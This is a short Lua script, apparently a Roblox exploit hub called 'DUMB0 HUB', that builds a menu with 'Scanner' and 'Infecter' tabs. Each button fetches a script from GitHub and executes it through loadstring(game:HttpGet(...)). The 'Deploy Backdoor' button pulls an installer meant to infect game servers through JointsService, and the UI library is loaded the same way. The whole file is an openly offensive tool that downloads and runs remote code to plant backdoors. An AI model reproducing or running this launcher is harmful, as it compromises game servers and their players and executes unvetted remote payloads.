-- [[ DUMB0 HUB: GUI EDITION ]] --
local username = "its-Dumb0xd"
local repo = "Dumb0"

-- 1. Load the UI Library (This creates the window)
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("DUMB0 HUB - v1.0", "DarkTheme")

-- 2. Create Tabs
local MainTab = Window:NewTab("Scanner")
local MainSection = MainTab:NewSection("Vulnerability Hunter")

local InfectTab = Window:NewTab("Infecter")
local InfectSection = InfectTab:NewSection("Server-Side Deployer")

-- 3. Add the Scanner Logic to a Button
MainSection:NewButton("Deep Scan Server", "Scans for backdoors", function()
    local url = "https://raw.githubusercontent.com/"..username.."/"..repo.."/main/Backdoor-Scanner/script.lua"
    local Scanner = loadstring(game:HttpGet(url))()
    if Scanner then
        Scanner.Scan()
    end
end)

-- 4. Add the Infecter Logic to a Button
InfectSection:NewButton("Deploy Backdoor", "Attempts to infect JointsService", function()
    local url = "https://raw.githubusercontent.com/"..username.."/"..repo.."/main/Backdoor-Infecter/installer.lua"
    loadstring(game:HttpGet(url))()
end)

Library:Notify("Dumb0 Hub Loaded!", "Ready to scan.", 5)
